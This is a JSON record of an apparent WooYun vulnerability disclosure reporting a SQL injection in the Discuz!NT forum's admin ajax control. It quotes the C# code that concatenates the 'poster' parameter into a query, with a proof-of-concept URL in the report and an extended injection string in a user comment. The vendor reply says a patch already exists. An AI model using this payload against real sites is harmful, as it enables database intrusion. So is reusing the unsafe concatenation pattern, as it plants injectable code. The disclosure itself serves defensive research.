{"id": 22972, "wybug_id": "wooyun-2011-02009", "wybug_title": "Discuz!NT 2.x - 3.5.2 SQL注入", "wybug_corp": "Discuz!", "wybug_author": "龍", "wybug_date": "2011-04-29 15:07", "wybug_open_date": "2011-04-29 15:15", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-04-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Discuz!NT 是康盛创想(Comsenz)旗下的一款功能强大的基于 ASP.NET 平台的社区软件。 详细说明：  ajaxtopicinfo.ascx用户控件 poster  SQL注入漏洞   漏洞证明：  文件 admin/UserControls/ ajaxtopicinfo.ascx 中转到函数 GetCondition (WebsiteManage.cs) //62 行         if (posterlist != \"\")                        {                               string[] poster = posterlist.Split(',');                             condition += \" AND [poster] in (\";                                 string tempposerlist = \"\";                                foreach (string p in poster)                                 {                                             tempposerlist += \"'\" + p + \"',\";                                   }                                  if (tempposerlist != \"\")                                        tempposerlisttempposerlist = tempposerlist.Substring(0, tempposerlist.Length -                        1);                              condition += tempposerlist + \")\"; posterlist变量没有过滤直接进入SQL语句查询，造成SQL注入EXP:/admin/ajax.aspx?AjaxTemplate=ajaxtopicinfo.ascx&poster=1')   修复方案：     版权声明：转载请注明来源 龍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2011-04-29 15:15 厂商回复： 已出补丁。 最新状态： 2011-04-29：已在3月25出了补丁。  ", "replys": "漏洞评价：\n评论\n     2011-04-29 15:09 |    \t\t龍 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:20        | 关注网络安全,关注漏洞研究)\t\t \n  EXP:admin/ajax.aspx?AjaxTemplate=ajaxtopicinfo.ascx&poster=1')字符 ') AND [tid]>=1 AND [tid]<=1'     \n     2011-04-29 18:56 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  都好久的东西了...又被转来了,乌云咋不查查就通过了?    \n     2011-04-29 23:07 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我的责任 对通过的用户太信任了：（    \n     2011-04-30 10:29 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  晕，被转到这里了。。。    \n     2011-04-30 11:18 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  对不起jannock了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}